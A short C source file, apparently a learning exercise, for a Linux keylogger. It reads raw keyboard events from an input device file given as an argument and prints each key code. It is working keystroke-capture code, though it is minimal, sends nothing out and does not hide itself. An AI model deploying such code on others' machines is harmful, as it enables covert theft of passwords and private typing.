#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char* argv[]){


    if (argc != 2){
        
        printf("usage: %s <event-file-path>", argv[0]);
        exit(-1);

    }
    printf("keylogger enabled\n");

    // file descriptor : open event file -> read (get buffer)
    int fd = open(argv[1], O_RDONLY, 0);    // argv[1] is where the event file is, only for reading
    
    printf("opened  file descriptor: %d\n", fd);

    struct input_event ev;
    // input_event is already declared in linux/input
    // contains RAW data of event:  time, type, code, value
    // in keylogger, keyboard input should be checked

    while(1){
        int n = read(fd, &ev, sizeof(ev));  // get buffer of input_event from fd(opened event)
        if (n < 0 || sizeof(ev)< 1) {
            printf("event read failed\n");
            exit(-2);
        } 
        if (ev.type != EV_KEY){
            printf("not keyboard event\n");
            continue;
        }
        printf("%d\n", ev.code);


    }



}
